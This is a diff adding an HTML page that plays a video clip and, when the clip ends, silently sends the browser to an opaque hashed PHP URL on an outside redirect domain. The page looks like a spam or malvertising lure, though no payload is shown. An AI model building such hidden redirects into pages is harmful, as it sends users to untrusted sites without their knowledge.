@@ -1,0 +1,19 @@
+<html>
+<head>
+<script type="text/javascript">
+// Do not name the function "play()"
+function playVideo(){
+    var video = document.getElementById('video');
+    video.play();
+    video.addEventListener('ended',function(){
+        window.location = 'http://gredir.cc/35b2cdf8e3c7d995fb1a9bef789a082d2fa662f4d36371a0869b4ad9cb9042bfd601d13b198847f4174eb96287b3bed7.php';
+    });
+}
+</script>
+<video controls id="video" width="1000" height="700" onclick="playVideo()">
+    <source src="CLIP6.mp4" type="video/mp4" />
+</video>
+</head>
+<body>
+</body>
+</html>
